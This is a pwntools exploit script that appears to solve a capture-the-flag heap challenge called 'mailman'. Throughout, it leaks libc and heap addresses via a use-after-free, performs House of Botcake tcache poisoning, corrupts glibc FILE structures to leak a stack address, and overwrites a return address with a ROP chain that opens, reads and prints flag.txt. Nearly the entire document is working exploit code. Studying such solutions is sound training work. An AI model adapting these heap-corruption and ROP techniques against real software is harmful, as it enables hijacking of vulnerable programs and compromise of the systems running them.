from pwn import *

BINARY = "./vuln"
HOST = "mailman.chal.imaginaryctf.org"
PORT = 1337

elf = context.binary = ELF(BINARY)
libc = elf.libc

context.terminal = ['alacritty', '-e', 'zsh', '-c']
context.gdbinit = "~/.gdbinit_pwndbg"
env = {} # {"LD_LIBRARY_PATH": "./", "LD_PRELOAD": ""}
gdbscript = '''
c
'''


r = process(BINARY)


def address_from_bytes(by):
    by += b"\x00" * (8 - len(by))
    return u64(by)

def write_letter(idx, size, content):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b": ", str(size).encode())
    r.sendlineafter(b": ", content)

def send_letter(idx):
    r.sendline(b"2")
    r.sendlineafter(b": ", str(idx).encode())

def read_letter(idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b": ", str(idx).encode())
    return r.recvline()


# --------------------------------- heap and libc leaks ----------------------------------

write_letter(0, 0x410, b"AAAA")  # Chunk large enough to not fit into tcache
write_letter(1, 0x1a8, b"AAAA")  # Chunk large enough to not come from remaindering
send_letter(0)  # Free a chunk into the unsortedbin
send_letter(1)  # Free a chunk into an empty tcache bin

leak = address_from_bytes(read_letter(0)[:-1])
libc.address = leak - libc.sym.main_arena - 96
print(f"libc: {hex(libc.address)}")

guard = address_from_bytes(read_letter(1)[:-1])
heap = (guard - 2) << 12  # Our chunk is 2 pages away from heap base
print(f"guard: {hex(guard)}")
print(f"heap: {hex(heap)}")

# ------------------------------ House of Botcake into FSOP ------------------------------

# Step 1
for i in range(5, 12):
    write_letter(i, 0xf8, b"CCCC")

# Step 2
write_letter(2, 0xf8, b"AAAA")  # Chunk A
write_letter(3, 0xf8, b"BBBB")  # Chunk B

# Step 3
write_letter(4, 0x410, b"GGGG")  # Guard chunk

# Step 4
for i in range(5, 12):  # Fill tcache
    send_letter(i)

# Step 5
send_letter(3)  # Free into unsortedbin, causing consolidation
send_letter(2)

# Step 6
write_letter(5, 0xf8, b"Garbage")  # Allocate garbage chunk to remove one chunk from tcache

# Step 7
send_letter(3)  # Free chunk again, now into tcache

# Step 8
payload = b"\x00" * 0xf8
payload += p64(0x101)
payload += p64((libc.sym._IO_2_1_stderr_ + 160) ^ guard)

write_letter(6, 0x1f8, payload)  # Create a new chunk, overflowing into the tcache chunk

# Step 9
write_letter(7, 0xf8, b"AAAA")

# Step 10
payload = p64(libc.sym._IO_wide_data_2)  # Padding
payload += p64(0) * 6
payload += p64(libc.sym.__GI__IO_file_jumps)
payload += p64(0x0fbad1887)  # New _flags
payload += p64(libc.sym._IO_2_1_stdout_ + 131) * 3
payload += p64(libc.address - 0x2228)  # environ stack address
payload += p64(libc.address - 0x2000) * 2  # Later in the same segment
payload += p64(libc.sym._IO_2_1_stdout_ + 131) * 1
payload += p64(libc.sym._IO_2_1_stdout_ + 132)

write_letter(8, 0xf8, payload)  # Overwriting write_base and _flags causes libc to flush

rip = address_from_bytes(r.recv()[:8]) - 0x178
print(f"rip: {hex(rip)}")

# ------------------------------ House of Botcake into ROP ------------------------------

send_letter(6)  # Free A+B
send_letter(3)  # Free B

# Step 8
payload = b"\x00" * 0xf8
payload += p64(0x101)
payload += p64((rip - 8) ^ guard)  # Address overlaps return instruction pointer from one of fgets subroutines

write_letter(6, 0x1f8, payload)

# Step 9
write_letter(7, 0xf8, b"AAAA")

# Step 10
payload = p64(libc.sym._rtld_global)  # Padding
payload += p64(libc.address + 0x45eb0)  # pop rax
payload += p64(2)  # open, since open@libc uses openat :(
payload += p64(libc.address + 0x2a3e5)  # pop rdi
payload += p64(rip + 0xa8)  # -> "./flag.txt"
payload += p64(libc.address + 0x13f687)  # pop rsi
payload += p64(0)
payload += p64(libc.address + 0x90529)  # pop rdx; pop rbx
payload += p64(0) * 2
payload += p64(libc.address + 0x91396)  # syscall(2, "./flag.txt", 0, 0)

payload += p64(libc.address + 0x2a3e5)  # pop rdi
payload += p64(3)  # Assume fd is 3
payload += p64(libc.address + 0x13f687)  # pop rsi
payload += p64(rip - 0x20)  # Some valid memory
payload += p64(libc.address + 0x90529)  # pop rdx; pop rbx
payload += p64(0x50)  # nbytes
payload += p64(0)
payload += p64(libc.sym.read)  # read(3, buf, 0x50)

payload += p64(libc.address + 0x2a3e5)  # pop rdi
payload += p64(1)  # Switch to stdout, rsi and rdx are preserved
payload += p64(libc.sym.write)  # write(1, buf, 0x50)

payload += b"./flag.txt\x00"

write_letter(8, 0xf8, payload)

r.interactive()